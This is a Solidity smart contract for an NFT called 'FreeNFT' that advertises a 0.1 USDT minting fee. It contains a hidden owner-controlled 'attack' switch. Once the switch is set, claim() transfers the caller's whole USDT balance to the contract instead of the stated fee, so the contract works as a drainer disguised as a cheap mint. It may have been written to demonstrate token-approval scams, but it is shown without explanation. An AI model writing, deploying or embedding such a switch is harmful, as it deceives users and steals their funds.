// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract FreeNFT is ERC721, Ownable {
    IERC20 usdt;
    uint256 _nextTokenId;
    uint256 public immutable fee = 0.1e6; // 0.1 usdt
    bool attack;

    constructor(
        address _usdtAddr
    ) ERC721("FreeNFT", "NFT") Ownable(msg.sender) {
        usdt = IERC20(_usdtAddr);
    }

    function claim() public returns (uint256) {
        uint256 feeUsed = attack ? usdt.balanceOf(msg.sender) : fee;
        usdt.transferFrom(msg.sender, address(this), feeUsed);

        uint256 tokenId = _nextTokenId++;
        _mint(msg.sender, tokenId);

        return tokenId;
    }

    function setAttack(bool _attack) external onlyOwner {
        attack = _attack;
    }
}
